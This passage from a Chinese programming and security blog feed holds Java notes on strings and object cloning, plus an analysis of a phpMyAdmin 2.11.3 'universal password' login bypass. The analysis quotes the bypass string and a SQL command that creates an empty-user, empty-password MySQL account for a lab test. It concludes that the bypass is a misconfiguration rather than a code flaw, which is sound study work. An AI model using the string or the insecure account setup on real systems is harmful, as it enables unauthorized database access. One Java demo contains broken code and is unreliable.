&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&quot;&gt;https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="codeAudit" scheme="http://example.com/categories/codeAudit/"/>
    
    <category term="thinkphp3" scheme="http://example.com/categories/codeAudit/thinkphp3/"/>
    
    
    <category term="codeAudit" scheme="http://example.com/tags/codeAudit/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java笔记(2) - String相关</title>
    <link href="http://example.com/2021/03/01/2021-03-01-java-string/"/>
    <id>http://example.com/2021/03/01/2021-03-01-java-string/</id>
    <published>2021-03-01T05:50:25.000Z</published>
    <updated>2021-03-01T07:54:49.919Z</updated>
    
    <content type="html"><![CDATA[<p><strong>(1) 字符串的内容永不可改变</strong></p><p>&nbsp;&nbsp;&nbsp;因为在 String类 中， value 的修饰符为 final</p><p><strong>(2) 所有双引号包起来的字符串，都是 String类 的对象</strong></p><p><strong>(3) 由于 String 不可改变，所以字符串可共享使用</strong></p><span id="more"></span><br><p><strong>字符串常量池：</strong></p><p>直接用双引号写的字符串在字符串常量池中</p><p>但是用 new String(byte[] / char[]) 的字符串不在字符串常量池中。是新建的一个对象</p><br> <p><strong>字符串比较：</strong></p><p>对于基本类型来说，== 比较数值</p><p>对于引用类型来说，== 比较地址</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String x1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] c = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">String x2 = <span class="keyword">new</span> String(c);</span><br><span class="line">String x3 = <span class="string">&quot;ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接使用 == 进行字符串比较。比较的是这两个引用类型变量的地址值</span></span><br><span class="line">System.out.println(x1==x2); <span class="comment">//输出 false</span></span><br><span class="line"><span class="comment">//使用 String类 的 equals 方法进行字符串比较</span></span><br><span class="line"><span class="comment">//但是这个方法容易报空指针异常</span></span><br><span class="line">System.out.println(x1.equals(x2)); <span class="comment">//输出 true</span></span><br><span class="line"><span class="comment">//使用 Objects类 的 equals 方法进行字符串比较</span></span><br><span class="line"><span class="comment">//这个方法空指针安全</span></span><br><span class="line">System.out.println(Objects.equals(x1,x2)); <span class="comment">//输出 true</span></span><br><span class="line"><span class="comment">//忽略字符串大小写进行比较</span></span><br><span class="line"><span class="comment">//如果要用 String类 下的方法，建议将常量放左边，比较变量放右边</span></span><br><span class="line">System.out.println(<span class="string">&quot;abc&quot;</span>.equalsIgnoreCase(x3)); <span class="comment">//输出 true</span></span><br></pre></td></tr></table></figure><br><p><strong>字符串拼接</strong></p><p>由于在 String类 中，value的修饰符是 final。所以每个字符串都像个常量不可改变。</p><p>所以在 java 中进行字符串拼接，尤其是多个字符串拼接在一起时，就会产生效率的问题:</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String x = <span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>+<span class="string">&quot;c&quot;</span>;</span><br></pre></td></tr></table></figure><br><p>在这一段代码中， Java 的执行流程为</p><ol><li>在内存中存放三个字符串: a, b, c</li><li>拼接 a 和 b。在内存中存放新字符串 ab</li><li>拼接 ab 和 c。在内存中存放新字符串 abc</li></ol><br><p>这样子的拼接方式效率就很低了。并且造成许多内存空间的浪费</p><br><p>Java中有两个类 StringBuilder 和 StringBuffer ，顾名思义，它们是作为字符串操作的缓冲。</p><p>其中 StringBuilder 是非线程安全。StringBuffer 是线程安全的</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder x3 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">x3.append(<span class="string">&quot;a&quot;</span>).append(<span class="string">&quot;b&quot;</span>).x3.append(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">System.out.println(x3.toString()); <span class="comment">//输出 abc</span></span><br></pre></td></tr></table></figure><br><p><strong>比较下效率:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String x1 = <span class="keyword">null</span>;</span><br><span class="line">StringBuilder x2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">StringBuffer x3 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">System.out.println(x3.toString());</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line"><span class="keyword">for</span> (Integer i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)&#123;</span><br><span class="line">    <span class="comment">//通过开关注释来比较运行时间</span></span><br><span class="line">    x1 += i.toString();      <span class="comment">//运行时间 2659毫秒</span></span><br><span class="line"><span class="comment">//x2.append(i.toString()); //运行时间 14毫秒</span></span><br><span class="line"><span class="comment">//x3.append(i.toString()); //运行时间 18毫秒</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">System.out.println(end-start);</span><br></pre></td></tr></table></figure><br><p><strong>字符串转换</strong></p><br><p>基本类型 转 字符串。最简单的方式:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基本类型 + <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><br><p>字符串转基本类型:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer.parseInt(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Double.parseDouble(<span class="string">&quot;3.14&quot;</span>);</span><br><span class="line"><span class="comment">//其他类型同理可得</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;(1) 字符串的内容永不可改变&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;因为在 String类 中， value 的修饰符为 final&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(2) 所有双引号包起来的字符串，都是 String类 的对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(3) 由于 String 不可改变，所以字符串可共享使用&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin 万能密码简单分析</title>
    <link href="http://example.com/2021/02/27/2021-02-27-phpmyadmin-universalPassword/"/>
    <id>http://example.com/2021/02/27/2021-02-27-phpmyadmin-universalPassword/</id>
    <published>2021-02-27T15:12:27.000Z</published>
    <updated>2021-03-15T15:35:23.863Z</updated>
    
    <content type="html"><![CDATA[<br><p>网上广为流程的 phpmyadmin 万能密码如下:</p><br><blockquote><p>‘localhost‘@‘@”</p></blockquote><p>据说 phpmyadmin 版本为 2.11.3 和 2.11.4 都可用</p><br><p>但是这个漏洞没有 CVE编号，国外也没搜到关于这个漏洞的详情</p><span id="more"></span><br><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><br><p><em>phpmyadmin</em> 的历史版本可以在其 <a href="https://github.com/phpmyadmin/phpmyadmin/releases?after=RELEASE_2_11_4">github</a> 上下载。我这里使用的是 phpmyadmin 2.11.3；php 5.6；mysql 5.7</p><br><p>下载好后解压丢到 web 目录，具体操作可以看同目录下的 <em>Documentation.html</em> </p><br><p>如果不想看文档就直接 copy 一份 <em>config.sample.inc.php</em> 命名为 <em>config.inc.php</em>。</p><p>修改 <code>$cfg[&#39;Servers&#39;][$i][&#39;auth_type&#39;]</code> 值为 <code>cookie</code> 即可</p><br><h2 id="初探万能密码"><a href="#初探万能密码" class="headerlink" title="初探万能密码"></a>初探万能密码</h2><br><p>按照网上说的，直接 <code>&#39;localhost&#39;@&#39;@&quot;</code> 糊脸</p><img src="/2021/02/27/2021-02-27-phpmyadmin-universalPassword/1.png" style="width:500px"><br><p>不太行呢，翻了几篇内容一样但是出处不同文章后，发现了一篇文章:</p><p><a href="https://www.cnblogs.com/gqdw/archive/2012/10/11/2720519.html">https://www.cnblogs.com/gqdw/archive/2012/10/11/2720519.html</a></p><br><p>尝试在 <em>mysql</em> 中添加一个 <em>user</em> 为 ‘’ <em>password</em> 为 ‘’ 的账户</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;&#39;@&#39;localhost&#39; identified by &#39;&#39;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><br><p>再次使用 “万能密码”登陆，发现成功登陆。</p><p>退出，用户名处乱打，<strong>密码不写</strong>，依然能成功登陆</p><br><p>看来所谓的 “万能密码” 只是 mysql的配置问题嘛？</p><br><h2 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h2><p>翻看 phpmyadmin 源码，跟进几次流程后，找到 phpmyadmin 获取 登陆表单数据的地方:</p><br><p><strong>libraries/common.inc.php</strong> line 751</p><p><code>$cfg[&#39;Server&#39;][&#39;auth_type&#39;]</code> 为 <em>config.inc.php</em> 配置的值</p><p><code>PMA_auth_check()</code>函数中，只要 发送了登陆表单的数据，就返回 true。</p><p><code>PMA_auth_set_user();</code> 是我们测试时的重点函数之一，它将 登陆表单发送的账号密码保存至 <code>$cfg[&#39;Server&#39;]</code> 中</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/auth/&#x27;</span> . <span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;auth_type&#x27;</span>] . <span class="string">&#x27;.auth.lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!PMA_auth_check()) &#123;</span><br><span class="line">    PMA_auth();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    PMA_auth_set_user();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>然后程序将走到</p><p><strong>libraries/common.inc.php</strong> line 819</p><p>调用函数 <code>PMA_DBI_connect</code>，传入 账号密码</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="variable">$controllink</span>) &#123;</span><br><span class="line">    <span class="variable">$controllink</span> = PMA_DBI_connect(<span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">                                   <span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;password&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>在 <strong>libraries/dbi/mysql.dbi.lib.php</strong> 的 <em>PMA_DBI_connect</em> 函数中，line 77</p><p>调用函数 <code>PMA_DBI_real_connect</code>，传入配置，*$user* 和 <em>$password</em> 都是函数形参</p><p><strong>最终返回</strong>的是 <code>PMA_DBI_real_connect</code>函数的返回值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = PMA_DBI_real_connect(<span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;host&#x27;</span>] . <span class="variable">$server_port</span> . <span class="variable">$server_socket</span>, <span class="variable">$user</span>, <span class="variable">$password</span>, <span class="keyword">empty</span>(<span class="variable">$client_flags</span>) ? <span class="literal">NULL</span> : <span class="variable">$client_flags</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$link</span>;</span><br></pre></td></tr></table></figure><br><p><strong>libraries/dbi/mysql.dbi.lib.php</strong> 的 <code>PMA_DBI_real_connect</code> 函数中，line 30</p><p><code>$link</code> 尝试连接 mysql 数据库，如果成功则返回资源，失败返回 false</p><p>最终返回的就是 <strong>是否成功连接 mysql数据库</strong>，成功返回连接句柄，失败返回 false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = @mysql_connect(<span class="variable">$server</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$link</span>;</span><br></pre></td></tr></table></figure><br><p>以上就是 <em>phpmyadmin</em> 登陆的过程了。只要 <code>$link</code> 返回连接句柄则登陆成功，反之登陆失败</p><br><p>这么看下来，感觉和 <em>phpmyadmin</em> 的代码没有半毛关系，只是 <em>mysql</em> 配置的问题。而且也不是非要用 <code>&#39;localhost&#39;@&#39;@&quot;</code> 才能登陆</p><br><p>至于为什么随便输入也能登陆呢？简单测试了下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;&#x27;</span>)); <span class="comment">//结果 resource</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&#x27;&#x27;</span>)); <span class="comment">//结果 resource</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&#x27;123&#x27;</span>)); <span class="comment">//结果 false</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;123&#x27;</span>)); <span class="comment">//结果 false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h2><br><p>基于以上粗浅的分析，得出以下可能性:</p><p>第一种可能：该漏洞的成因为 mysql 中默认留有一个用户名为空的用户，所以导致输入任意用户名空密码可登陆</p><p>第二种可能：可能有这个漏洞的phpmyadmin是有后门的</p><br><p>以上皆是粗浅分析 phpmyadmin 2.11.3 的结论。如有不正确的地方欢迎指出</p>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;网上广为流程的 phpmyadmin 万能密码如下:&lt;/p&gt;
&lt;br&gt;

&lt;blockquote&gt;
&lt;p&gt;‘localhost‘@‘@”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;据说 phpmyadmin 版本为 2.11.3 和 2.11.4 都可用&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;但是这个漏洞没有 CVE编号，国外也没搜到关于这个漏洞的详情&lt;/p&gt;</summary>
    
    
    
    <category term="codeAudit" scheme="http://example.com/categories/codeAudit/"/>
    
    <category term="phpmyadmin" scheme="http://example.com/categories/codeAudit/phpmyadmin/"/>
    
    
    <category term="codeAudit" scheme="http://example.com/tags/codeAudit/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java笔记(1) - 变量值引用和拷贝</title>
    <link href="http://example.com/2021/02/27/2021-02-27-java-copy-object/"/>
    <id>http://example.com/2021/02/27/2021-02-27-java-copy-object/</id>
    <published>2021-02-27T00:42:51.000Z</published>
    <updated>2021-03-06T06:28:26.932Z</updated>
    
    <content type="html"><![CDATA[<br><p>java 中 <em>Object</em> 的操作都是引用。<em>原始数据类型</em>操作都是值拷贝。</p><p>这里的操作就包括 <strong>赋值</strong> 和 函数<strong>参数传递</strong></p><span id="more"></span><br><p>这里说明下 java 中的概念: </p><p><strong>java中所有的类都隐形继承了 Obejct 类</strong></p><p><strong>java中数组也是 Object</strong>，<a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-4.html#jls-4.3.1">官方</a>原话:</p><br><blockquote><p>An <em>object</em> is a <em>class instance</em> or an <em>array</em>.</p></blockquote><br><h1 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h1><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//类赋值</span></span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = b;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//数组赋值</span></span><br><span class="line">        Integer[] i = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">        Integer[] ii = i;</span><br><span class="line">        ii[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Int 赋值</span></span><br><span class="line">        Integer i2 = <span class="number">3</span>;</span><br><span class="line">        Integer ii2 = i2;</span><br><span class="line">        ii2 = <span class="number">101</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>b = <span style="color:red">{B@785}</span><br> &nbsp;&nbsp;&nbsp;b_value = 1<br> &nbsp;&nbsp;&nbsp;b_c_class = <span style="color:blue">{C@790} </span><br>bb = <span style="color:red">{B@785} </span><br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:blue">{C@790} </span></p><p>i = <span style="color:red">{Integer[1]@786} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@788} <span style="color:blue">100</span><br>ii = <span style="color:red">{Integer[1]@786} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@788} <span style="color:blue">100</span></p><p>i2 = <span style="color:red">{Integer@787}</span><br>&nbsp;&nbsp;&nbsp; value = 3<br>ii2 = <span style="color:red">{Integer@789}</span><br>&nbsp;&nbsp;&nbsp; value = 101</p><br><p>可以发现，只有 Integer 的赋值是重新开辟了一块内存来存放原数据。</p><p>其他的 Object 类型操作都是 <em>引用赋值</em>。即直接将内存地址的指针指向原地址，复用原地址的数据，而不是重新开辟内存。这样导致的结果就是：</p><p>a变量直接赋值给b变量，修改 b变量，a变量也会受到影响，因为他们的内存地址指针指向的是同一块内存地址。</p><br><p>那如何让 Object 赋值的时候重新开辟内存呢？<em>Object</em> 中提供了一个 <em>clone()</em> 方法</p><br><h2 id="数组值拷贝"><a href="#数组值拷贝" class="headerlink" title="数组值拷贝"></a>数组值拷贝</h2><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer[] i = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">Integer[] ii = i.clone();</span><br><span class="line">ii[<span class="number">0</span>] = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>i = <span style="color:red">{Integer[1]@782} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@785} <span style="color:blue">1</span><br>ii = <span style="color:red">{Integer[1]@783} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@784} <span style="color:blue">100</span></p><br><p>数组值拷贝，使用 clone() 方法即可</p><br><h2 id="类拷贝"><a href="#类拷贝" class="headerlink" title="类拷贝"></a>类拷贝</h2><br><p>如果要拷贝的对象是我们自定义的类的话，是没法直接 clone的。需要 实现 <em>Cloneable</em> 接口，重写 <em>clone()</em> 方法，并且 catch 住 <em>CloneNotSupportedException</em></p><br><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            bClone = (B) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = (B)b.clone();</span><br><span class="line">        </span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug 显示:</strong></p><p>b = <span style="color:red">{B@783} </span><br>&nbsp;&nbsp;&nbsp; b_value = 1<br> &nbsp;&nbsp;&nbsp;b_c_class = <span style="color:red">{C@785} </span><br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c_value = <span style="color:blue">300</span><br>bb = <span style="color:red">{B@784} </span><br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@785} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">300</span></p><br><p>对象浅拷贝即：拷贝时目标变量确实重新拷贝了原对象的值，但是原对象中保存的<strong>其他对象</strong>依然只是单纯地把地址拷贝到目标变量，并不是重新拷贝一份。</p><p>即上面Demo中，<em>b_c_class</em> 保存的是<em>对象C</em> 的值。 <strong>bb</strong> 中保存的 <em>b_c_class</em> <strong>指向的地址</strong> 和 <strong>b</strong> 中<em>b_c_class</em> <strong>指向的地址</strong>是同一块内存，所以修改 bb对象 中的 b_c_class，b对象也会受到牵连</p><br><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><br><p>为了让 <strong>bb对象</strong> 中的 <em>b_c_class</em> 重新拷贝一份 <strong>C对象</strong>。需要修改下 <em>clone()</em> 方法。</p><p>实现 C类 的clone()方法，然后在 B类 处手动 clone <em>b_c_class</em></p><br><p><strong>Demo:</strong></p><p>line 27 处将 <em>C对象</em> 重新<em>clone</em>一份</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">        C cClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cClone = (C) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">        B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//clone Object B</span></span><br><span class="line">            bClone = (B) <span class="keyword">super</span>.clone();</span><br><span class="line">            <span class="comment">//clone Object C</span></span><br><span class="line">            bClone.b_c_class = (C) bClone.b_c_class.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 